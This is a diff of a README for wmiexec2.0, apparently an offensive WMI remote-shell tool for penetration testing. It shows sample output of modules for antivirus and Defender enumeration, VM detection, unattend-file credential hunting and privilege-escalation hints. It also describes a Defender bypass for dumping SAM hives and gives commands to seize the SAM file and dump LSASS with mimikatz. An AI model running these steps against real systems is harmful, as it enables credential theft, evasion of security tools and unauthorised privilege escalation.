@@ -52,24 +52,86 @@ python3 wmiexec2.0.py WORKGROUP/Administrator:'Password123!@#'@10.0.0.4 -shell-t
 - `ls` || `ls C:\Users` - allows you to view your current target directory. Its executing the `dir /a` command so you will see hidden files by default without any other special options
 ## Sysinfo
 - To see basic target information use this module
-- ![sysinfo1](https://user-images.githubusercontent.com/75596877/218882046-dd75ae2b-0ea8-4fe4-b87b-678825b77c15.png)
+````
+👻 PS C:\>  sysinfo
+[*] Target
+dockerw-vg85334\administrator
+
+[*] Hostname
+DOCKERW-VG85334
+
+[*] Arch: 
+PROCESSOR_ARCHITECTURE=AMD64
+
+[*] IP Addresses: 
+   Link-local IPv6 Address . . . . . : fe80::f45c:9e14:7b55:d0b2%4(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 20.20.20.21(Preferred)
+````
 ## Anti-Virus
 - View some well known security products running on the target system.
 - Enumerates the process list to see if they are running.
+````
+👻 PS C:\>  av
+MsMpEng.exe
+````
+## Defender
+- Check specific Defender settings
+````
+👻 PS C:\>  defender
+[*] Defender Install Location
+    InstallLocation    REG_SZ    C:\Program Files\Windows Defender\
+
+[*] Defender Service is Running
+[*] Defender Process Exclusions
+	No Process Exclusions
+[*] Defender Path Exclusions
+[*] Tamper Protection is Disabled
+````
 ## VMcheck
 - Attempts to detect if you are in a virtual machine (So far works for ESXi/VMWare Workstation and QEMU) 
 - Performs three checks 
 - Looks for `C:\Program Files\VMWare`
 - Looks for common running executables in a proccess list
 - Pulls the `System Manufactuer` from host
-- ![image](https://user-images.githubusercontent.com/75596877/219784824-89f497bf-1426-4f03-8729-ef90b0178515.png)
+````
+👻 PS C:\>  vmcheck
+[*] Common Processes: 
+[*] No VM Processes found
+C:\Program Files\VMware Not Present
+OS Manufacturer:           Microsoft Corporation
+System Manufacturer:       QEMU
 
+[*] Virtual Box Detection
+[!] Found VBox Files:
+File Not Found
+File Not Found
+````
 ## unattend
 - There are 11 files (that I know of) part of the `unattend` group in Windows that have the potential to have base64 encoded credentials in them. Find them all in one command
-- ![unattend1](https://user-images.githubusercontent.com/75596877/218882205-26e6e22a-0b29-4cc1-9009-1fb05b9b7dbf.png)
+````
+👻 PS C:\>  unattend
+[*] Looking for: C:\unattend.txt, C:\unattend.inf
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features
+    TamperProtection    REG_DWORD    0x1
+
+End of search: 1 match(es) found.
+
+[*] Looking for: C:\Windows\sysprep.inf
+Nothing Found
+[*] Looking for: C:\Windows\sysprep\sysprep.xml, C:\Windows\sysprep\sysprep.inf
+Nothing Found
+[*] Looking for: C:\Windows\Panther\Unattended.xml, C:\Windows\Panther\Unattend.xml
+06/12/2024  04:33 PM            24,206 unattend.xml
+
+[*] Looking for: C:\Windows\Panther\Unattend\Unattend.xml, C:\Windows\Panther\Unattend\Unattended.xml
+Nothing Found
+[*] Looking for: C:\Windows\System32\Sysprep\unattend.xml, C:\Windows\System32\Sysprep\unattended.xml
+Nothing Found
+````
 ## Regrip
-- Save off the `SAM`, `Security` and `System` hives to your local machines.  Defender blocks this by default, so I had to find a bypass working as of 2/7/23.  Try to not get this signatured, thanks in advance.
-- ![regrip1](https://user-images.githubusercontent.com/75596877/218882349-8c7ea3bf-5c14-4e6f-b5e9-7178b573e5a8.png)
+- Save off the `SAM`, `Security` and `System` hives to your local machines.  Defender blocks this by default, so I had to find a bypass working as of 6/7/24.  Try to not get this signatured, thanks in advance.
+
 ## Tunneling
 - Leverage Windows built in `netsh` tunneling without having to type the whole thing out 
 - See picture for usage options
@@ -79,6 +141,26 @@ python3 wmiexec2.0.py WORKGROUP/Administrator:'Password123!@#'@10.0.0.4 -shell-t
 - Will download any file in `C:\windows\system32\winevt\logs`
 - Use: `loggrab Security.evtx`
 - ![image](https://user-images.githubusercontent.com/75596877/218882689-6ea2c4f3-d037-45f7-9a99-b267ab310281.png)
+# Tokens 
+- This module will enumerate your currently Enabled tokens and attempt to match them with a priv esc
+````
+👻 PS C:\>  tokens
+[*] SeImpersonate Enabled:
+	Juicy-Potato
+	RougeWinRM
+	SweetPotato
+	PrintSpoofer
+[*] SeBackupPrivilege Enabled:
+	https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
+	https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
+	https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec
+[*] SeTakeOwnershipPrivilege Enabled:
+	takeown /f "C:\windows\system32\config\SAM"
+	icacls "C:\windows\system32\config\SAM" /grant <your_username>:F
+[*] SeDebugPrivilege Enabled:
+	Procdump.exe on LSASS.exe, use mimikatz
+````
+
 ## Survey
 - under active development
 - Input your own custom commands into `survey.conf` file seperated by a new line, or use the basic one that I have provided
